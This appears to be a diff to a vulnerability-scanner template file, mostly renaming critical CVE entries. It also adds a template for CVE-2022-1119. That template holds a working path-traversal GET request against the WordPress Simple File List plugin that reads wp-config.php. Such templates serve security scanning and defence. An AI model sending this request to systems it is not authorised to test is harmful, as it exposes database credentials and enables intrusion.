@@ -4615,7 +4615,7 @@
     {
       "id": "CVE-2016-3088",
       "info": {
-        "name": "ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)",
+        "name": "Apache ActiveMQ Fileserver - Arbitrary File Write",
         "severity": "critical"
       },
       "requests": [
@@ -6494,7 +6494,7 @@
     {
       "id": "CVE-2018-15961",
       "info": {
-        "name": "Adobe ColdFusion Unrestricted File Upload RCE",
+        "name": "Adobe ColdFusion - Unrestricted File Upload Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7254,7 +7254,7 @@
     {
       "id": "CVE-2018-7251",
       "info": {
-        "name": "AnchorCMS Error Log Exposure",
+        "name": "Anchor CMS 0.12.3 - Error Log Exposure",
         "severity": "critical"
       },
       "requests": [
@@ -10949,7 +10949,7 @@
     {
       "id": "CVE-2020-26214",
       "info": {
-        "name": "Alerta Authentication Bypass",
+        "name": "Alerta < 8.1.0 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -16457,7 +16457,7 @@
     {
       "id": "CVE-2021-45232",
       "info": {
-        "name": "Apache APISIX Dashboard API Unauthorized Access",
+        "name": "Apache APISIX Dashboard <2.10.1 API Unauthorized Access",
         "severity": "critical"
       },
       "requests": [
@@ -16832,6 +16832,21 @@
       ]
     },
     {
+      "id": "CVE-2022-1119",
+      "info": {
+        "name": "WordPress Simple File List < 3.2.8 - Unauthenticated Arbitrary File Download",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -17061,7 +17076,7 @@
     {
       "id": "CVE-2022-24112",
       "info": {
-        "name": "Apache APISIX apisix/batch-requests Remote Code Execution",
+        "name": "Apache APISIX - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
